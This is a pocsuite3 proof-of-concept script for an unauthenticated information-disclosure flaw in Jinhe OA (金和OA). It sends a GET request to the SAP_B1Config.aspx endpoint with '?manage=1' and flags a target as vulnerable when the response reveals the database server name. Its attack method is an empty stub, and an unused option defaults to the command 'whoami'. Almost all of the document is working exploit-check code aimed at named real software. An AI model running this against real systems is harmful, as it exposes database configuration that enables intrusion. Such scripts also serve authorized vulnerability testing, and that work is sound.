# -*- coding:utf-8 -*-

from collections import OrderedDict
from pocsuite3.api import Output, POCBase, register_poc, requests, OptString

class DemoPOC(POCBase):
    vulID = ""
    version ='1'
    author = ["LMX"]
    vulDate = "2023"
    createDate = "2024-2-20"
    updateDate = "2024-2-20"
    references =[]
    name ="金和网络-金和OA"
    appPowerLink = ''
    appName = '金和OA'
    appVersion = ''
    vulType = '信息泄露'
    desc = '''
    未授权信息泄露
    '''
    
    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):
        result ={}
        urlparts = self.url
        parts = urlparts.split('/')
        urlresult = '/'.join(parts[:3])
        url = str(urlresult) + '/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1'
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': 'text/html; charset=gb2312',
                    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    }
        r = requests.get(url=url,headers=headers)
        try:
            if r.status_code == 200 and '数据库服务器名' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        result = {}
        return self.parse_output(result)
        
register_poc(DemoPOC) 
